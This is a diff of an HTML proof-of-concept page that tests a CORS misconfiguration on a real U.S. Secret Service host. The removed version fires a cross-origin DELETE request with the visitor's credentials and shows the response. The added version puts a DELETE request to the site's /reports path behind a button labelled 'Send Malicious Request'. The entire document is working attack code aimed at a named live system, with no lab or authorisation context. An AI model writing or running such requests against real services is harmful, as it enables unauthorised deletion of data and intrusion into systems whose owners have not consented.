@@ -1,28 +1,28 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>CORS Misconfig PoC - USSS</title>
-  </head>
   <body>
-    <h2>Sending Cross-Origin DELETE Request</h2>
-    <p>If the CORS misconfig exists, the response below should show something instead of a CORS error:</p>
-   <script>
-  fetch("https://pix.secretservice.gov/errors/page-not-found", {
-    method: "DELETE",
-    mode: "no-cors",
-    credentials: "include"
-  })
-  .then(response => {
-    document.body.innerHTML += `<p><strong>Status:</strong> ${response.status}</p>`;
-    return response.text();
-  })
-  .then(text => {
-    document.body.innerHTML += "<h4>Response:</h4><pre>" + text + "</pre>";
-  })
-  .catch(err => {
-    document.body.innerHTML += "<h4>Error:</h4><pre>" + err + "</pre>";
-  });
-</script>
+    <h2>Testing CORS Misconfiguration (DELETE)</h2>
+    <button onclick="sendRequest()">Send Malicious Request</button>
 
+    <script>
+      function sendRequest() {
+        fetch("https://pix.secretservice.gov/reports", {
+          method: "DELETE",
+          mode: "cors",
+          headers: {
+            "Content-Type": "application/json"
+          }
+        })
+        .then(response => response.text())
+        .then(data => {
+          console.log("Response:", data);
+          alert("Request sent! Check console.");
+        })
+        .catch(error => {
+          console.error("Error:", error);
+          alert("Error: " + error);
+        });
+      }
+    </script>
   </body>
 </html>
